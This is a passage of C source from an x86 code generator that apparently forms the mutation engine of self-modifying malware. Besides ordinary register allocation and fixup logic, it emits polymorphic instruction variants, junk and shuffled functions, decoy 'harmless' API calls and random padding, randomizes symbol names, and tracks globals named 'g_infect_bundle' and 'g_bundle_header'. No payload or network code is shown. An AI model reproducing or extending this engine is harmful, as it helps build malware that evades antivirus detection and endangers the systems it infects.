                    emit_sub_poly(rd, rd, r2, scr);
                } else if (rd == r1) {
                    emit_sub_rr(rd, r2);
                } else if (rd == r2) {
                    emit_neg(rd);
                    emit_add_rr(rd, r1);
                } else {
                    emit_mov_rr(rd, r1);
                    emit_sub_rr(rd, r2);
                }

            } else if (opcode == OP_MUL) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def_reuse(ins->dest.index, r1, r2);
                if (rd == r1) {
                    emit_imul_rr(rd, r2);
                } else if (rd == r2) {
                    emit_imul_rr(rd, r1);
                } else {
                    emit_mov_rr(rd, r1);
                    emit_imul_rr(rd, r2);
                }

            } else if (opcode == OP_DIV) {
                gen_divmod(ins, 0);

            } else if (opcode == OP_MOD) {
                gen_divmod(ins, 1);

            } else if (opcode == OP_NEG) {
                r1 = ra_load_src(&ins->src1);
                rd = ra_def(ins->dest.index, r1, -1);
                if (rd != r1) { emit_mov_rr(rd, r1); }
                emit_neg(rd);

            } else if (opcode == OP_AND) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def_reuse(ins->dest.index, r1, r2);
                if (rd == r1) { emit_and_rr(rd, r2); }
                else if (rd == r2) { emit_and_rr(rd, r1); }
                else { emit_mov_rr(rd, r1); emit_and_rr(rd, r2); }

            } else if (opcode == OP_OR) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def_reuse(ins->dest.index, r1, r2);
                if (rd == r1) { emit_or_rr(rd, r2); }
                else if (rd == r2) { emit_or_rr(rd, r1); }
                else { emit_mov_rr(rd, r1); emit_or_rr(rd, r2); }

            } else if (opcode == OP_XOR) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def_reuse(ins->dest.index, r1, r2);
                if (g_x86_poly_instrs != 0) {
                    scr = ra_get_scratch(rd, r1, r2);
                    scr2 = ra_get_scratch(rd, r2, scr);
                    if (rd == r2 && rd != r1) {
                        emit_mov_rr(rd, r2);
                        emit_xor_poly(rd, rd, r1, scr, scr2);
                    } else {
                        if (rd != r1) { emit_mov_rr(rd, r1); }
                        emit_xor_poly(rd, rd, r2, scr, scr2);
                    }
                } else {
                    if (rd == r1) { emit_xor_rr(rd, r2); }
                    else if (rd == r2) { emit_xor_rr(rd, r1); }
                    else { emit_mov_rr(rd, r1); emit_xor_rr(rd, r2); }
                }

            } else if (opcode == OP_NOT) {
                r1 = ra_load_src(&ins->src1);
                rd = ra_def(ins->dest.index, r1, -1);
                if (rd != r1) { emit_mov_rr(rd, r1); }
                emit_not(rd);

            } else if (opcode == OP_SHL) {
                gen_shift(ins, 0);

            } else if (opcode == OP_SHR) {
                gen_shift(ins, 1);

            } else if (opcode == OP_EQ || opcode == OP_NE || opcode == OP_LT
                    || opcode == OP_LE || opcode == OP_GT || opcode == OP_GE) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                if (g_x86_poly_instrs != 0) {
                    scr = ra_get_scratch(r1, r2, -1);
                    emit_cmp_poly(r1, r2, scr);
                } else {
                    emit_cmp_rr(r1, r2);
                }
                // Ensure EAX available for result
                if (g_ra_alloc[REG_EAX] >= 0) {
                    if (ins->dest.kind != VK_TEMP || g_ra_alloc[REG_EAX] != ins->dest.index) {
                        ra_spill_reg(REG_EAX);
                    }
                }
                if (opcode == OP_EQ) { cmp_cc = CC_E; }
                else if (opcode == OP_NE) { cmp_cc = CC_NE; }
                else if (opcode == OP_LT) { cmp_cc = CC_L; }
                else if (opcode == OP_LE) { cmp_cc = CC_LE; }
                else if (opcode == OP_GT) { cmp_cc = CC_G; }
                else { cmp_cc = CC_GE; }
                emit_mov_ri(REG_EAX, 0);
                emit_jcc_short(cmp_cc ^ 1, 5);
                emit_mov_ri(REG_EAX, 1);
                if (ins->dest.kind == VK_TEMP) {
                    g_ra_alloc[REG_EAX] = ins->dest.index;
                    g_ra_temp_reg[ins->dest.index] = REG_EAX;
                    g_ra_dirty[ins->dest.index] = 1;
                }

            } else if (opcode == OP_LOAD) {
                if (ins->src1.kind == VK_LOCAL && ins->type_code == TC_PTR
                    && g_current_func->local_sizes[ins->src1.index] > 0) {
                    rd = ra_def(ins->dest.index, -1, -1);
                    offset = get_local_offset(ins->src1.index);
                    emit_byte(0x8D);
                    emit_byte(modrm(2, rd, REG_EBP));
                    emit_u32(offset);
                } else if (ins->src1.kind == VK_PARAM && ins->type_code == TC_PTR) {
                    rd = ra_def(ins->dest.index, -1, -1);
                    offset = get_param_offset(ins->src1.index);
                    emit_mov_rm_disp(rd, REG_EBP, offset);
                } else {
                    r1 = ra_load_src(&ins->src1);
                    if (ins->src1.kind == VK_TEMP) {
                        rd = ra_def(ins->dest.index, r1, -1);
                        if (ins->type_code == TC_I8) {
                            emit_movzx_rm_byte(rd, r1);
                        } else {
                            emit_mov_rm(rd, r1);
                        }
                    } else {
                        if (ins->dest.kind == VK_TEMP) {
                            rd = ra_def(ins->dest.index, r1, -1);
                            if (rd != r1) { emit_mov_rr(rd, r1); }
                        }
                    }
                }

            } else if (opcode == OP_STORE) {
                need_byte = 0;
                if (ins->type_code == TC_I8) { need_byte = 1; }
                rv = ra_load_src(&ins->src1);
                // Byte store: value must be in byte-addressable register
                if (need_byte != 0 && rv >= 4 && rv != REG_EBX) {
                    alt = ra_get_scratch(rv, -1, -1);
                    if (alt >= 4 && alt != REG_EBX) {
                        ra_free_reg(REG_EAX);
                        alt = REG_EAX;
                        g_ra_alloc[REG_EAX] = -2;
                    }
                    emit_mov_rr(alt, rv);
                    rv = alt;
                }
                if (ins->dest.kind == VK_LOCAL) {
                    offset = get_local_offset(ins->dest.index);
                    if (need_byte != 0) { emit_mov_mr_disp_byte(REG_EBP, offset, rv); }
                    else { emit_mov_mr_disp(REG_EBP, offset, rv); }
                } else if (ins->dest.kind == VK_PARAM) {
                    offset = get_param_offset(ins->dest.index);
                    if (need_byte != 0) { emit_mov_mr_disp_byte(REG_EBP, offset, rv); }
                    else { emit_mov_mr_disp(REG_EBP, offset, rv); }
                } else if (ins->dest.kind == VK_TEMP) {
                    rp = ra_ensure_ex(ins->dest.index, rv);
                    if (need_byte != 0) { emit_mov_mr_byte(rp, rv); }
                    else { emit_mov_mr(rp, rv); }
                } else if (ins->dest.kind == VK_GLOBAL) {
                    if (g_pic_mode != 0) {
                        emit_push(rv);
                        addr_reg = ra_get_scratch(rv, -1, -1);
                        base_pos = emit_pic_lea(addr_reg);
                        fixup_pos = g_code->len;
                        emit_u32(0);
                        add_glob_fixup(fixup_pos, ins->dest.index, base_pos);
                        emit_pop(rv);
                        emit_mov_mr(addr_reg, rv);
                    } else if (g_abs_mode != 0) {
                        if (need_byte != 0) { emit_byte(0x88); }
                        else { emit_byte(0x89); }
                        emit_byte(modrm(0, rv, 5));
                        add_abs_data_fixup(g_code->len, g_global_offsets[ins->dest.index]);
                        emit_u32(0);
                    } else {
                        addr_reg = ra_get_scratch(rv, -1, -1);
                        emit_mov_ri(addr_reg, g_global_offsets[ins->dest.index]);
                        emit_mov_mr(addr_reg, rv);
                    }
                }

            } else if (opcode == OP_ADDR) {
                rd = ra_def(ins->dest.index, -1, -1);
                if (ins->src1.kind == VK_GLOBAL) {
                    if (g_pic_mode != 0) {
                        base_pos = emit_pic_lea(rd);
                        fixup_pos = g_code->len;
                        emit_u32(0);
                        add_glob_fixup(fixup_pos, ins->src1.index, base_pos);
                    } else if (g_abs_mode != 0) {
                        emit_mov_ri(rd, 0);
                        add_abs_data_fixup(g_code->len - 4, g_global_offsets[ins->src1.index]);
                    } else {
                        emit_mov_ri(rd, g_global_offsets[ins->src1.index]);
                    }
                } else {
                    offset = 0;
                    if (ins->src1.kind == VK_LOCAL) {
                        offset = get_local_offset(ins->src1.index);
                    } else if (ins->src1.kind == VK_PARAM) {
                        offset = get_param_offset(ins->src1.index);
                    }
                    emit_byte(0x8D);
                    emit_byte(modrm(2, rd, REG_EBP));
                    emit_u32(offset);
                }

            } else if (opcode == OP_PTRADD) {
                r1 = ra_load_src(&ins->src1);
                r2 = ra_load_src_ex(&ins->src2, r1);
                rd = ra_def(ins->dest.index, r1, r2);
                if (ins->elem_size > 1) {
                    scr = ra_get_scratch(rd, r1, r2);
                    emit_byte(0x6B);
                    emit_byte(modrm(3, scr, r2));
                    emit_byte(ins->elem_size);
                    if (rd != r1) { emit_mov_rr(rd, r1); }
                    emit_byte(0x01);
                    emit_byte(modrm(3, scr, rd));
                } else {
                    if (rd == r1) {
                        emit_byte(0x01);
                        emit_byte(modrm(3, r2, rd));
                    } else if (rd == r2) {
                        emit_byte(0x01);
                        emit_byte(modrm(3, r1, rd));
                    } else {
                        emit_mov_rr(rd, r1);
                        emit_byte(0x01);
                        emit_byte(modrm(3, r2, rd));
                    }
                }

            } else if (opcode == OP_FIELDPTR) {
                r1 = ra_load_src(&ins->src1);
                rd = ra_def(ins->dest.index, r1, -1);
                if (rd != r1) { emit_mov_rr(rd, r1); }
                if (ins->offset != 0) { emit_add_ri(rd, ins->offset); }

            } else if (opcode == OP_ALLOCA) {
                size = ins->offset;
                size = (size + 3) & (0 - 4);
                emit_sub_ri(REG_ESP, size);
                rd = ra_def(ins->dest.index, -1, -1);
                emit_mov_rr(rd, REG_ESP);

            } else if (opcode == OP_JMP) {
                ra_spill_all();
                if (ins->target_block <= b) {
                    target = g_block_offsets[ins->target_block];
                    rel = target - (g_code->len + 5);
                    emit_jmp_rel(rel);
                } else {
                    add_fixup(g_code->len + 1, ins->target_block, 5);
                    emit_jmp_rel(0);
                }

            } else if (opcode == OP_JZ) {
                r1 = ra_load_src(&ins->src1);
                emit_test_rr(r1, r1);
                ra_spill_all();
                if (ins->target_block <= b) {
                    target = g_block_offsets[ins->target_block];
                    rel = target - (g_code->len + 6);
                    emit_jcc_rel(CC_E, rel);
                } else {
                    add_fixup(g_code->len + 2, ins->target_block, 6);
                    emit_jcc_rel(CC_E, 0);
                }

            } else if (opcode == OP_JNZ) {
                r1 = ra_load_src(&ins->src1);
                emit_test_rr(r1, r1);
                ra_spill_all();
                if (ins->target_block <= b) {
                    target = g_block_offsets[ins->target_block];
                    rel = target - (g_code->len + 6);
                    emit_jcc_rel(CC_NE, rel);
                } else {
                    add_fixup(g_code->len + 2, ins->target_block, 6);
                    emit_jcc_rel(CC_NE, 0);
                }

            } else if (opcode == OP_CALL) {
                gen_call_common(ins, 1);

            } else if (opcode == OP_CALLV) {
                gen_call_common(ins, 0);

            } else if (opcode == OP_ICALL) {
                gen_icall_common(ins, 1);

            } else if (opcode == OP_ICALLV) {
                gen_icall_common(ins, 0);

            } else if (opcode == OP_SYSCALL) {
                gen_syscall_common(ins);

            } else if (opcode == OP_FUNC_ADDR) {
                // Get code address of function into dest register
                // Uses CALL/POP getbase + ADD with faddr fixup
                // Layout: E8 00000000  POP rd  81 C0+rd  [imm32]
                // After POP: rd = address of POP instruction
                // After ADD: rd = address of POP + imm32 = func address
                // Fixup resolves: imm32 = func_offset - pop_offset (both from code start)
                rd = ra_def(ins->dest.index, -1, -1);
                emit_byte(0xE8); emit_u32(0);   // CALL next
                emit_byte(0x58 + rd);             // POP rd
                emit_byte(0x81);                  // ADD rd, imm32
                emit_byte(0xC0 + rd);
                add_faddr_fixup(g_code->len, ins->func_idx);
                emit_u32(0);
                g_ra_dirty[ins->dest.index] = 1;

            } else if (opcode == OP_RET) {
                if (ins->src1.kind == VK_TEMP) {
                    ra_force(ins->src1.index, REG_EAX);
                } else {
                    if (g_ra_alloc[REG_EAX] >= 0) { ra_spill_reg(REG_EAX); }
                    load_operand(&ins->src1, REG_EAX);
                }
                emit_pop(REG_EDI);
                emit_pop(REG_ESI);
                emit_pop(REG_EBX);
                emit_mov_rr(REG_ESP, REG_EBP);
                emit_pop(REG_EBP);
                emit_ret();
                block_returned = 1;

            } else if (opcode == OP_RETV) {
                emit_pop(REG_EDI);
                emit_pop(REG_ESI);
                emit_pop(REG_EBX);
                emit_mov_rr(REG_ESP, REG_EBP);
                emit_pop(REG_EBP);
                emit_ret();
                block_returned = 1;

            } else if (opcode == OP_EMIT) {
                int rk;
                rk = 0;
                while (rk < ins->raw_count) {
                    emit_byte(ins->raw_bytes[rk]);
                    rk = rk + 1;
                }

            } else {
                emit_byte(0x90);
            }

            if (block_returned == 0) {
                ra_free_dead();
                ra_clear_scratch();
            }

            i = i + 1;
        }
        // Control-flow instructions spill internally; no block-end spill needed.
        b = b + 1;
    }

    // Apply forward jump fixups
    f = 0;
    while (f < g_fixup_count) {
        patch_pos = g_fixup_offsets[f];
        target_block = g_fixup_targets[f];
        target = g_block_offsets[target_block];
        instruction_end = patch_pos + 4;
        rel = target - instruction_end;
        g_code->data[patch_pos] = rel & 0xFF;
        g_code->data[patch_pos + 1] = (rel >> 8) & 0xFF;
        g_code->data[patch_pos + 2] = (rel >> 16) & 0xFF;
        g_code->data[patch_pos + 3] = (rel >> 24) & 0xFF;
        f = f + 1;
    }

    free(g_block_offsets);
    g_block_offsets = 0;
    ra_free_func();
}

// =============================================================================
// Name Randomization
// =============================================================================

void randomize_names() {
    int* prot;
    int i;
    int f;
    int b;
    int a;
    int j;
    int s;
    int r;
    int len;
    struct Function* func;
    struct Block* blk;
    struct Instruction* ins;
    char* new_name;
    char** old_strings;

    prot = malloc((g_mod->string_count + 1) * 4);
    i = 0;
    while (i < g_mod->string_count) {
        prot[i] = 0;
        i = i + 1;
    }

    // Protect VK_STRING references (actual string literals used in code)
    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        b = 0;
        while (b < func->block_count) {
            blk = &func->blocks[b];
            i = 0;
            while (i < blk->instr_count) {
                ins = &blk->instrs[i];
                if (ins->dest.kind == VK_STRING) { prot[ins->dest.index] = 1; }
                if (ins->src1.kind == VK_STRING) { prot[ins->src1.index] = 1; }
                if (ins->src2.kind == VK_STRING) { prot[ins->src2.index] = 1; }
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_STRING) { prot[ins->args[a].index] = 1; }
                    a = a + 1;
                }
                i = i + 1;
            }
            b = b + 1;
        }
        f = f + 1;
    }

    // Protect extern function names and DLL names
    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        if (func->block_count == 0) {
            prot[func->name_idx] = 1;
            if (func->dll_idx > 0) { prot[func->dll_idx] = 1; }
        }
        f = f + 1;
    }

    // Protect entry function name ("main")
    prot[g_mod->funcs[g_mod->entry_func].name_idx] = 1;

    // Protect global string init values (init_kind == 2 means string ref) and
    // global variable names themselves — emit_globals does str_eq lookups on
    // names like "g_bundle_header" / "g_infect_bundle" to record their
    // data-section offsets, so the names must survive randomization.
    i = 0;
    while (i < g_mod->global_count) {
        if (g_mod->globals[i].init_kind == 2) {
            prot[g_mod->globals[i].init_value] = 1;
        }
        prot[g_mod->globals[i].name_idx] = 1;
        i = i + 1;
    }

    // Save old string pointers (for block label fixup)
    old_strings = malloc(g_mod->string_count * 4);
    i = 0;
    while (i < g_mod->string_count) {
        old_strings[i] = g_mod->strings[i];
        i = i + 1;
    }

    // Replace unprotected strings with random names
    i = 0;
    while (i < g_mod->string_count) {
        if (prot[i] == 0) {
            len = 7;
            new_name = malloc(len + 1);
            new_name[0] = 'r';
            j = 1;
            while (j < len) {
                r = prng_range(16);
                if (r < 10) {
                    new_name[j] = '0' + r;
                } else {
                    new_name[j] = 'a' + r - 10;
                }
                j = j + 1;
            }
            new_name[len] = 0;
            g_mod->strings[i] = new_name;
        }
        i = i + 1;
    }

    // Update function name pointers
    f = 0;
    while (f < g_mod->func_count) {
        g_mod->funcs[f].name = g_mod->strings[g_mod->funcs[f].name_idx];
        f = f + 1;
    }

    // Update global name pointers
    i = 0;
    while (i < g_mod->global_count) {
        g_mod->globals[i].name = g_mod->strings[g_mod->globals[i].name_idx];
        i = i + 1;
    }

    // Update block label pointers (find by old pointer match)
    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        b = 0;
        while (b < func->block_count) {
            blk = &func->blocks[b];
            s = 0;
            while (s < g_mod->string_count) {
                if (blk->label == old_strings[s]) {
                    blk->label = g_mod->strings[s];
                    s = g_mod->string_count;
                }
                s = s + 1;
            }
            b = b + 1;
        }
        f = f + 1;
    }

    // Free old unprotected strings
    i = 0;
    while (i < g_mod->string_count) {
        if (prot[i] == 0) {
            free(old_strings[i]);
        }
        i = i + 1;
    }
    free(old_strings);
    free(prot);
}

// =============================================================================
// String and Global emission
// =============================================================================

void scan_used_strings(int* used) {
    int f;
    int b;
    int i;
    int a;
    struct Function* func;
    struct Block* blk;
    struct Instruction* ins;

    i = 0;
    while (i < g_mod->string_count) {
        used[i] = 0;
        i = i + 1;
    }

    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        b = 0;
        while (b < func->block_count) {
            blk = &func->blocks[b];
            i = 0;
            while (i < blk->instr_count) {
                ins = &blk->instrs[i];
                if (ins->dest.kind == VK_STRING) {
                    used[ins->dest.index] = 1;
                }
                if (ins->src1.kind == VK_STRING) {
                    used[ins->src1.index] = 1;
                }
                if (ins->src2.kind == VK_STRING) {
                    used[ins->src2.index] = 1;
                }
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_STRING) {
                        used[ins->args[a].index] = 1;
                    }
                    a = a + 1;
                }
                i = i + 1;
            }
            b = b + 1;
        }
        f = f + 1;
    }
}

void emit_strings() {
    int* used;
    int i;
    int len;
    char* str;

    used = malloc((g_mod->string_count + 1) * 4);
    scan_used_strings(used);

    i = 0;
    while (i < g_mod->string_count) {
        if (used[i] != 0) {
            g_str_offsets[i] = g_data->len;
            str = g_mod->strings[i];
            len = str_len(str);
            buf_write_bytes(g_data, str, len + 1);
        } else {
            g_str_offsets[i] = 0 - 1;
        }
        i = i + 1;
    }
    free(used);
}

void emit_globals() {
    int i;
    struct Global* g;

    g_infect_bundle_off = -1;
    g_bundle_header_off = -1;

    i = 0;
    while (i < g_mod->global_count) {
        while (g_data->len % 4 != 0) {
            buf_write_u8(g_data, 0);
        }
        g_global_offsets[i] = g_data->len;
        g = &g_mod->globals[i];
        if (g->name != 0) {
            if (str_eq(g->name, "g_infect_bundle") != 0) { g_infect_bundle_off = g_data->len; }
            if (str_eq(g->name, "g_bundle_header") != 0) { g_bundle_header_off = g_data->len; }
        }
        if (g->size == 1) {
            buf_write_u8(g_data, g->init_value & 0xFF);
        } else if (g->size <= 4) {
            buf_write_u32(g_data, g->init_value);
        } else {
            // Array global: write init_value for first 4 bytes, zero for rest
            int pad;
            buf_write_u32(g_data, g->init_value);
            pad = 4;
            while (pad < g->size) {
                buf_write_u8(g_data, 0);
                pad = pad + 1;
            }
        }
        i = i + 1;
    }
}

// =============================================================================
// Module code generation
// =============================================================================

void gen_module() {
    int i;
    int j;
    int code_size;
    int fixup_pos;
    int str_idx;
    int base_pos;
    int displacement;
    int glob_idx;
    int rel;
    int target_off;
    struct Function* f;
    int* gen_order;
    int gen_count;
    int tmp;
    int total_count;
    int gi;
    int real_count;
    int pic_pad;

    emit_strings();
    emit_globals();

    // Initialize free register pool
    init_free_regs();

    // PIC preamble: JMP over API table slot + random padding (skip in scatter mode)
    if (g_pic_mode != 0 && g_abs_mode == 0) {
        pic_pad = 0;
        if (g_x86_poly_instrs != 0 || g_x86_dead_code != 0 || g_x86_opaque != 0
         || g_x86_junk_funcs != 0 || g_x86_harmless_calls != 0 || g_x86_shuffle_funcs != 0) {
            pic_pad = prng_range(8) * 2;
        }
        emit_byte(0xEB);
        emit_byte(4 + pic_pad);
        g_api_slot_offset = g_code->len;
        if (pic_pad > 0) {
            i = 0;
            while (i < 4) { emit_byte(prng_range(256)); i = i + 1; }
            i = 0;
            while (i < pic_pad) { emit_byte(prng_range(256)); i = i + 1; }
        } else {
            emit_u32(0);
        }
    }

    // Initialize call fixup arrays
    g_call_fixup_cap = 4096;
    g_call_fixup_offsets = malloc(g_call_fixup_cap * 4);
    g_call_fixup_targets = malloc(g_call_fixup_cap * 4);
    g_call_fixup_count = 0;

    // Initialize func addr fixup arrays
    g_faddr_fixup_cap = 64;
    g_faddr_fixup_offsets = malloc(g_faddr_fixup_cap * 4);
    g_faddr_fixup_targets = malloc(g_faddr_fixup_cap * 4);
    g_faddr_fixup_count = 0;

    // Initialize junk call fixup arrays
    g_junk_call_fixup_cap = 4096;
    g_junk_call_fixup_offsets = malloc(g_junk_call_fixup_cap * 4);
    g_junk_call_fixup_targets = malloc(g_junk_call_fixup_cap * 4);
    g_junk_call_fixup_count = 0;

    // Find injected harmless extern APIs for junk/dead-code calls
    find_harmless_apis();

    // Count non-extern (real) functions
    real_count = 0;
    i = 0;
    while (i < g_mod->func_count) {
        f = &g_mod->funcs[i];
        if (f->block_count > 0) {
            real_count = real_count + 1;
        }
        i = i + 1;
    }

    // Determine junk function count (proportional to real function count)
    if (g_x86_junk_funcs != 0) {
        g_junk_func_count = real_count * g_genome[GI_JUNK_FUNC_PCT] / 100;
        if (g_junk_func_count < 1) { g_junk_func_count = 1; }
    } else {
        g_junk_func_count = 0;
    }
    g_junk_func_offsets = malloc((g_junk_func_count + 1) * 4);

    // Build generation order (non-extern functions)
    // Allocate enough for real + junk functions
    gen_order = malloc((g_mod->func_count + g_junk_func_count) * 4);
    gen_count = 0;
    i = 0;
    while (i < g_mod->func_count) {
        f = &g_mod->funcs[i];
        if (f->block_count > 0) {
            gen_order[gen_count] = i;
            gen_count = gen_count + 1;
        }
        i = i + 1;
    }

    // Add junk function entries as negative sentinel values: -(junk_idx + 1)
    total_count = gen_count;
    gi = 0;
    while (gi < g_junk_func_count) {
        gen_order[total_count] = 0 - (gi + 1);
        total_count = total_count + 1;
        gi = gi + 1;
    }

    // Fisher-Yates shuffle entire gen_order (real + junk mixed)
    if (g_x86_shuffle_funcs != 0 && total_count > 1) {
        i = total_count - 1;
        while (i > 0) {
            j = prng_range(i + 1);
            tmp = gen_order[i];
            gen_order[i] = gen_order[j];
            gen_order[j] = tmp;
            i = i - 1;
        }
    }

    // Generate functions in (possibly shuffled) order
    i = 0;
    while (i < total_count) {
        if (gen_order[i] >= 0) {
            // Real function
            g_func_offsets[gen_order[i]] = g_code->len;
            gen_function(gen_order[i]);
        } else {
            // Junk function: index = -(gen_order[i] + 1)
            gi = 0 - (gen_order[i] + 1);
            gen_junk_function(gi);
        }
        i = i + 1;
    }

    free(gen_order);

    // Resolve call fixups (and record abs call fixups for scatter)
    i = 0;
    while (i < g_call_fixup_count) {
        fixup_pos = g_call_fixup_offsets[i];
        target_off = g_func_offsets[g_call_fixup_targets[i]];
        rel = target_off - (fixup_pos + 4);
        buf_patch_u32(g_code, fixup_pos, rel);
        if (g_abs_mode != 0) {
            add_abs_call_fixup(fixup_pos, target_off);
        }
        i = i + 1;
    }

    free(g_call_fixup_offsets);
    free(g_call_fixup_targets);

    // Resolve FUNC_ADDR fixups (and record abs faddr fixups for scatter)
    // Each fixup patches the imm32 of an ADD instruction following a CALL/POP getbase.
    // Layout: E8 00 00 00 00  58+rd  81 C0+rd  [imm32 at fixup_pos]
    // After POP: rd = code_start + (fixup_pos - 3)  (POP is 3 bytes before imm32)
    // After ADD: rd = code_start + (fixup_pos - 3) + imm32
    // We want: rd = code_start + g_func_offsets[target]
    // So: imm32 = g_func_offsets[target] - (fixup_pos - 3)
    i = 0;
    while (i < g_faddr_fixup_count) {
        fixup_pos = g_faddr_fixup_offsets[i];
        target_off = g_func_offsets[g_faddr_fixup_targets[i]];
        rel = target_off - (fixup_pos - 3);
        buf_patch_u32(g_code, fixup_pos, rel);
        if (g_abs_mode != 0) {
            add_abs_faddr_fixup(fixup_pos, target_off);
        }
        i = i + 1;
    }

    free(g_faddr_fixup_offsets);
    free(g_faddr_fixup_targets);

    // Resolve junk call fixups (and record abs call fixups for scatter)
    i = 0;
    while (i < g_junk_call_fixup_count) {
        fixup_pos = g_junk_call_fixup_offsets[i];
        target_off = g_junk_func_offsets[g_junk_call_fixup_targets[i]];
        rel = target_off - (fixup_pos + 4);
        buf_patch_u32(g_code, fixup_pos, rel);
        if (g_abs_mode != 0) {
            add_abs_call_fixup(fixup_pos, target_off);
        }
        i = i + 1;
    }

    free(g_junk_call_fixup_offsets);
    free(g_junk_call_fixup_targets);
    free(g_junk_func_offsets);
    free(g_harmless_api_indices);

    // Apply string fixups
    code_size = g_code->len;
    i = 0;
    while (i < g_str_fixup_count) {
        fixup_pos = g_str_fixup_offsets[i];
        str_idx = g_str_fixup_indices[i];
        base_pos = g_str_fixup_bases[i];
        displacement = code_size - base_pos + g_str_offsets[str_idx];
        buf_patch_u32(g_code, fixup_pos, displacement);
        i = i + 1;
    }

    // Apply global fixups
    i = 0;
    while (i < g_glob_fixup_count) {
        fixup_pos = g_glob_fixup_offsets[i];
        glob_idx = g_glob_fixup_indices[i];
        base_pos = g_glob_fixup_bases[i];
        displacement = code_size - base_pos + g_global_offsets[glob_idx];
        buf_patch_u32(g_code, fixup_pos, displacement);
        i = i + 1;
    }
}

// =============================================================================
// Codegen initialization helper
// =============================================================================

void init_codegen() {
    g_code = buf_new(65536);
    g_data = buf_new(4096);
    g_func_offsets = malloc(g_mod->func_count * 4);
    g_block_offsets = 0;
    g_stack_size = 0;
    g_api_slot_offset = 0;
    g_entry_func_idx = g_mod->entry_func;

    // Fixup arrays
    g_fixup_cap = 1024;
    g_fixup_offsets = malloc(g_fixup_cap * 4);
    g_fixup_targets = malloc(g_fixup_cap * 4);
    g_fixup_sizes = malloc(g_fixup_cap * 4);
    g_fixup_count = 0;

    // String offsets and fixups
    g_str_offsets = malloc((g_mod->string_count + 1) * 4);
    g_str_fixup_cap = 4096;
    g_str_fixup_offsets = malloc(g_str_fixup_cap * 4);
    g_str_fixup_indices = malloc(g_str_fixup_cap * 4);
    g_str_fixup_bases = malloc(g_str_fixup_cap * 4);
    g_str_fixup_count = 0;

    // Global offsets and fixups
    g_global_offsets = malloc((g_mod->global_count + 1) * 4);
    g_glob_fixup_cap = 4096;
    g_glob_fixup_offsets = malloc(g_glob_fixup_cap * 4);
    g_glob_fixup_indices = malloc(g_glob_fixup_cap * 4);
    g_glob_fixup_bases = malloc(g_glob_fixup_cap * 4);
    g_glob_fixup_count = 0;

    // Absolute-mode fixups
    g_abs_data_fixup_cap = 256;
    g_abs_data_fixup_offsets = malloc(g_abs_data_fixup_cap * 4);
    g_abs_data_fixup_data_offs = malloc(g_abs_data_fixup_cap * 4);
    g_abs_data_fixup_count = 0;
    g_abs_extern_fixup_cap = 256;
    g_abs_extern_fixup_offsets = malloc(g_abs_extern_fixup_cap * 4);
    g_abs_extern_fixup_slots = malloc(g_abs_extern_fixup_cap * 4);
    g_abs_extern_fixup_count = 0;
    g_abs_call_fixup_cap = 256;
    g_abs_call_fixup_offsets = malloc(g_abs_call_fixup_cap * 4);
    g_abs_call_fixup_targets = malloc(g_abs_call_fixup_cap * 4);
    g_abs_call_fixup_count = 0;
    g_abs_faddr_fixup_cap = 64;
    g_abs_faddr_fixup_offsets = malloc(g_abs_faddr_fixup_cap * 4);
    g_abs_faddr_fixup_targets = malloc(g_abs_faddr_fixup_cap * 4);
    g_abs_faddr_fixup_count = 0;

    // cdecl externs are opt-in via CF_CDECL_EXTERNS. Linux callers set the
    // flag explicitly; auto-detecting from dll_name would false-positive on
    // unified sources that declare both Win32 and Linux externs.
    g_cdecl_externs = 0;
    if ((g_compile_flags & CF_CDECL_EXTERNS) != 0) {
        g_cdecl_externs = 1;
    }

    // Register allocator
    g_ra_alloc = malloc(8 * 4);
    g_ra_reg_order = malloc(8 * 4);
    g_ra_temp_reg = 0;
    g_ra_dirty = 0;
    g_ra_last_use = 0;
    g_ra_num_regs = 0;
    g_ra_cur_instr = 0;
}

// =============================================================================
//
// Assemble Module
//
// Contains the following sections:
//   1. Assemble absolute-mode output
//   2. Assemble .bin output
//
// =============================================================================

// =============================================================================
// Assemble absolute-mode output with deferred fixup tables
// Format: [entry_offset:4][code_size:4][data_size:4]
//         [n_data_fixups:4][n_extern_fixups:4]
//         [n_call_fixups:4][n_faddr_fixups:4]
//         [extern_count:4][extern_info_size:4]
//         [data_fixups:   (code_off:4, data_off:4)  x N]
//         [extern_fixups: (code_off:4, api_slot:4)  x N]
//         [call_fixups:   (code_off:4, func_idx:4)  x N]
//         [faddr_fixups:  (code_off:4, func_idx:4)  x N]
//         [code][data][extern_info]
// =============================================================================

// PIC output header — 5 u32 fields (entry_off, code_sz, data_sz, ext_count, ext_info_sz)
int PIC_HEADER_SIZE            = 20;
// Abs-mode output header (PE and ELF) — 9 u32 fields
int ABS_HEADER_SIZE            = 36;

struct Buffer* assemble_abs_output() {
    struct Buffer* result;
    struct Buffer* extern_info;
    int entry_offset;
    int extern_count;
    int user_extern_count;
    int i;
    int slot;
    int found;
    int api_slot;
    char* dll_name;
    char* func_name;
    int dlen;
    int flen;

    entry_offset = g_func_offsets[g_mod->entry_func];

    // Count externals
    extern_count = 0;
    i = 0;
    while (i < g_mod->func_count) {
        if (g_mod->funcs[i].block_count == 0) {
            extern_count = extern_count + 1;
        }
        i = i + 1;
    }

    // Build extern_info — ALL externs, ordered by api_slot
    extern_info = buf_new(256);
    buf_write_u32(extern_info, extern_count);
    slot = 0;
    while (slot < extern_count) {
        i = 0;
        found = 0;
        while (i < g_mod->func_count && found == 0) {
            if (get_api_slot(i) == slot && g_mod->funcs[i].block_count == 0) {
                dll_name = g_mod->funcs[i].dll_name;
                func_name = g_mod->funcs[i].name;
                if (dll_name != 0) {
                    dlen = 0;
                    while (dll_name[dlen] != 0) { dlen = dlen + 1; }
